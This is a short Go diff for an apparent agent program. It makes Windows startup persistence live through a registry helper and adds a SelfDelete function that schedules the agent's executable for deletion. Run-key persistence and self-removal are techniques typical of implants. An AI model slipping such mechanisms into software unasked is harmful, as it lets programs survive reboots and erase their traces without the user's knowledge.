@@ -49,23 +49,37 @@ func (m *Manager) Disable() error {
 	}
 }
 
-// Windows implementation
+// SelfDelete schedules the agent executable for deletion.
+// On Windows, this uses MoveFileExW with MOVEFILE_DELAY_UNTIL_REBOOT
+// since a running process cannot delete its own file directly.
+// On other platforms, os.Remove is attempted immediately.
+func SelfDelete() {
+	exePath, err := os.Executable()
+	if err != nil {
+		return
+	}
+	selfDeletePlatform(exePath)
+}
+
+// Windows implementation — delegates to persistence_windows.go
 func (m *Manager) enableWindows(agentPath string) error {
-	// Registry Run key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-	// Requires admin for HKLM, HKCU works for user
+	if err := enableWindowsRegistry(agentPath); err != nil {
+		return err
+	}
 	m.isEnabled = true
-	return fmt.Errorf("windows persistence: requires admin to modify registry")
+	return nil
 }
 
 func (m *Manager) disableWindows() error {
+	if err := disableWindowsRegistry(); err != nil {
+		return err
+	}
 	m.isEnabled = false
 	return nil
 }
 
 // Linux implementation
 func (m *Manager) enableLinux(agentPath string) error {
-	// systemd user service or crontab
-	// For now, just mark as enabled
 	m.isEnabled = true
 	return fmt.Errorf("linux persistence: requires systemd service setup")
 }
